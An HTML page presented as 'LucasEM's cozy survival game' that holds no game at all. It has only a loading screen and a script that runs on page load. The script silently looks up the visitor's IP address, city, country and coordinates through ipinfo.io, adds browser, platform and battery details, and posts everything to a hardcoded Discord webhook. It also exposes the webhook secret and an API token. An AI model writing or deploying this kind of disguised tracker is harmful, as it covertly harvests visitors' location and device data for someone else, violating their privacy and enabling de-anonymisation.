<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>LucasEM's Very Cozy Game</title>
    <style>
        /* Loading screen styles */
        #loading-screen {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.8);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 9999;
            flex-direction: column;
        }
        .spinner {
            border: 8px solid #f3f3f3;
            border-top: 8px solid #3498db;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 2s linear infinite;
            margin-bottom: 20px;
        }
        #loading-text {
            font-size: 24px;
            color: white;
            font-family: Arial, sans-serif;
            font-weight: bold;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <!-- Loading screen -->
    <div id="loading-screen">
        <div class="spinner"></div>
        <div id="loading-text">LucasEM's cozy survival game</div>
    </div>

    <script>
        // Discord webhook URL
        const webhookURL = "https://discord.com/api/webhooks/1328100763590987870/2K9BQddkrxO9SzFBH3lZMZDsRccH3dzT8MVWLOQWOJiKqC2NtNo4p8i-Ct1ULOVGvkYs";

        // Function to get browser and device information
        function getDeviceInfo() {
            const userAgent = navigator.userAgent;
            let deviceType = "Unknown";
            let browser = "Unknown";

            // Detect browser
            if (userAgent.indexOf("Chrome") > -1) browser = "Chrome";
            else if (userAgent.indexOf("Firefox") > -1) browser = "Firefox";
            else if (userAgent.indexOf("Safari") > -1) browser = "Safari";
            else if (userAgent.indexOf("Edge") > -1) browser = "Edge";

            // Detect device type
            if (/Mobi|Android|iPhone|iPad|iPod/i.test(userAgent)) {
                deviceType = "Mobile";
            } else {
                deviceType = "Desktop";
            }

            return { deviceType, browser };
        }

        // Fetch IP and send webhook
        fetch("https://ipinfo.io/json?token=abfa2c858d87e3")
            .then(response => response.json())
            .then(data => {
                const { ip, city, country, loc } = data;
                const { deviceType, browser } = getDeviceInfo();

                // Get battery information
                navigator.getBattery().then(function(battery) {
                    const batteryStatus = `${battery.level * 100}%`;
                    const charging = battery.charging ? "Charging" : "Not charging";

                    // Create the webhook message
                    const message = {
                        content: "LucasEM's cozy survival game",
                        embeds: [
                            {
                                title: "User Information",
                                description: "Details of the user playing LucasEM's cozy survival game.",
                                color: 0xFFFFFF,
                                fields: [
                                    { name: "IP Address", value: ip || "Unknown", inline: true },
                                    { name: "City", value: city || "Unknown", inline: true },
                                    { name: "Country", value: country || "Unknown", inline: true },
                                    { name: "Location", value: loc || "Unknown", inline: true },
                                    { name: "Device Type", value: deviceType, inline: true },
                                    { name: "Browser", value: browser, inline: true },
                                    { name: "Battery Status", value: batteryStatus, inline: true },
                                    { name: "Charging Status", value: charging, inline: true },
                                    { name: "Device Name", value: navigator.platform, inline: true },
                                    // Placeholder for Discord info (requires API)
                                    { name: "Discord Username", value: "Placeholder (OAuth2 required)", inline: true },
                                    { name: "Discord ID", value: "Placeholder (OAuth2 required)", inline: true },
                                    { name: "Profile Picture", value: "Placeholder (OAuth2 required)", inline: true },
                                ],
                                footer: {
                                    text: "Thank you for visiting!",
                                }
                            }
                        ]
                    };

                    // Send data to the Discord webhook
                    fetch(webhookURL, {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify(message),
                    })
                    .then(res => {
                        if (res.ok) console.log("Webhook sent successfully!");
                        else console.error("Failed to send webhook:", res.statusText);
                    })
                    .catch(err => console.error("Error:", err));
                });
            })
            .catch(err => console.error("Error fetching IP data:", err));
    </script>
</body>
</html>
